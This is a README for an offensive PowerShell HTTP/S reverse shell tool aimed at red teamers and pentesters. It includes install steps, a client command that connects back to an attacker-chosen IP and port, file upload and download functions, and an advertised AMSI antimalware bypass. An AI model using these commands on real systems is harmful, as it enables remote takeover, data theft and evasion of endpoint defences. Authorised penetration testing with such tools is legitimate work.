Powershell HTTP/S Reverse Shell
------------

HTTP-revshell is a tool focused on redteam exercises and pentesters. This tool provides a reverse connection through the http/s protocol.

<p align="center"><img width=400 alt="HTTP-revshell" src="https://raw.githubusercontent.com/3v4Si0N/HTTP-revshell/master/images/logo.png"></p>

Installation
------------

```shell
git clone https://github.com/3v4Si0N/HTTP-revshell.git
cd HTTP-revshell/
pip3 install -r requirements.txt
```

server.py - server unisession
------------

Server usage:
```
usage: server.py [-h] [--ssl] host port

Process some integers.

positional arguments:
  host        Listen Host
  port        Listen Port

optional arguments:
  -h, --help  show this help message and exit
  --ssl       Send traffic over ssl
```

Invoke-WebRev.ps1 - client
------------

Client usage:
```
Import-Module .\Invoke-WebRev.ps1
Invoke-WebRev -ip IP -port PORT [-ssl]
```

Extra functions
------------

```
Upload
    Usage: upload /src/path/file C:\dest\path\file
```

```
Download
    Usage: download C:\src\path\file /dst/path/file
```

Features
------------

    - SSL
    - Proxy Aware
    - Upload Function
    - Download Function
    - Error Control
    - AMSI bypass

TODO
------------

    - Multiple sessions (only server-multisession.py)
    - Autocomplete
